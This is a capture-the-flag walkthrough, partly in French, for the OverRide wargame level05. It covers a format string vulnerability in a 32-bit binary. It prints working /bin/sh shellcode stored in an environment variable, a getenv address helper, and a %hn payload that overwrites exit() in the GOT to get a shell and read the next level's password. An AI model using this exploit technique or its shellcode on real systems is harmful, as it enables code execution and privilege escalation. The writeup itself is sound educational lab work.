# Level05 Walkthrough

## Analyzing the Program with GDB and ghidra

1. **Whats happening**: 

```bash
level05@OverRide:~$ ./level05
AAAAAAAAAAAAAAAAAAAA
aaaaaaaaaaaaaaaaaaaa
```

- Le programme utilise `repnz scas` pour calculer la longueur effective de la chaîne en mémoire.
```bash

0x080484e6 <+162>:   mov    %eax,%edx
0x080484f3 <+175>:   repnz scas %es:(%edi),%al <----- Here 
0x080484f5 <+177>:   mov    %ecx,%eax
0x080484f7 <+179>:   not    %eax
0x080484f9 <+181>:   sub    $0x1,%eax
```

- Here, we can see the use of `fgets()` without protection watching if its above 100, and also a conversion to lowercase `0x080484bb <+119>:   xor    $0x20,%edx` 

- `printf()` and then `exit()`
```bash
0x08048504 <+192>:   mov    %eax,(%esp)
0x08048507 <+195>:   call   0x8048340 <printf@plt>
0x08048513 <+207>:   call   0x8048370 <exit@plt>
```

- The vulnerability here is a `format string attack` 

2. **Trying the format string attack**

- Identify the offset: `10th position` 
```bash
python -c 'print "aaaa" + " %x " * 60' | ./level05
aaaa 64  f7fcfac0  0  0  0  0  ffffffff  ffffd764  f7fdb000  61616161  20782520  20782520  20782520  20782520  20782520  20782520  20782520  20782520  20782520  20782520  20782520  20782520  20782520  2078252
[...] just verify again
python -c 'print "aaaa %10$x"' | ./level05
aaaa 61616161
```

- Here lets use a shellcode using a env variable to avoid the `to_lowercase` alteration
```bash

export SHELLCODE=$(python -c 'print "\x90"*100 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"')

```

- to know the ENV address (ALWAYS USE THIS CODE), create it in /tmp
```bash
#include <stdio.h>
#include <stdlib.h>

int main ()
{
  printf("%p\n", getenv("SHELLCODE"));
  return 0;
}
```

- We also need the exit() function cuz we'll overwrite it (relocation address) in the `GOT` to target our shellcode instead : 
```bash
(gdb) info functions exit
All functions matching regular expression "exit":

Non-debugging symbols:
0x08048370  exit
0x08048370  exit@plt
(gdb) x/i 0x08048370
   0x8048370 <exit@plt>:        jmp    *0x80497e0 <----- This is exit() on the GOT
[...]
(gdb) x/wx 0x80497e0
0x80497e0 <exit@got.plt>:	0x08048376
```

- Now, its like rainfall level04, we'll have to write it 2bytes at a time with the `short modifier` (`%hn`). We can pass 2 addresses at the start of our buffer and acces them in $10 and $11. Now calculate our shellcode : 
```bash
printf %d 0xffff
0xffff = 65535

printf %d 0xd89a
0xd89a = 55450

65535 - 55450 = 10085
```

Everytime the address will change because we upload it, so we'll have to do the calculation everytime we do this level05.

---

3. **Final Payload Explanation**

- We know that, it's impossible to write long integer SHELLCODE which is like `4294957210` in decimal for `0xffffd89a`, so, we'll have to write in the high-order bytes (x0ffff) and the low-order bytes (0xd89a).

- `"%55442x%10$hn` : will write `55442` because we already have written 8 bytes for `exit()` 4 and for 4.

- `%10085x%11$hn` : will write `10085` which is the high order bytes 

```bash

python -c 'print "\x08\x04\x97\xe0"[::-1]+"\x08\x04\x97\xe2"[::-1]+ "%55442x%10$hn%10085x%11$hn"'> /tmp/toto/exploit

(cat /tmp/toto/exploit;cat) | ./level05
whoami
level06
cat /home/users/level06/.pass
h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
```


## Moving to level06

1. **Swith User to level06**:
    Run ```su level06```

2. **Authenticate with the Password**:
    
   
 